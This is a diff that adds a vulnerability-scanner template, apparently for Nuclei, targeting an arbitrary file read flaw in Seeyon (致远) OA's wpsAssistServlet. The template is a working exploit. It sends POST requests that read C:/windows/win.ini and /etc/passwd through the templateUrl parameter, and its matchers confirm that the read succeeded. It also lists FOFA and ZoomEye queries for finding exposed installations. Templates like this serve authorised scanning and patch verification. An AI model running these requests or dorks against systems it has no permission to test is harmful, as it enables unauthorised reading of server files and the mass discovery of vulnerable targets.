@@ -1,0 +1,33 @@
+id: seeyon-wpsassist-servlet-fileread
+
+info:
+  name: 致远OA存在任意文件读取漏洞
+  author: SleepingBag945
+  severity: high
+  description: |-
+    FOFA: app="致远互联-OA" && title="V8.0SP2"
+    ZoomEye: app:"用友 致远OA"
+  tags: seeyon,fileread
+
+
+http:
+  - raw:
+      - |
+        POST /seeyon/wpsAssistServlet HTTP/1.1
+        Host: {{Hostname}}
+
+        flag=template&templateUrl=C:/windows/win.ini
+      
+      - |
+        POST /seeyon/wpsAssistServlet HTTP/1.1
+        Host: {{Hostname}}
+
+        flag=template&templateUrl=/etc/passwd
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1==200 && contains(body_1, 'bit app support') && contains(body_1, 'fonts') && contains(body_1, 'extensions')"
+          - "status_code_2==200 && regex('root:.*:0', body_2)"
+        condition: or
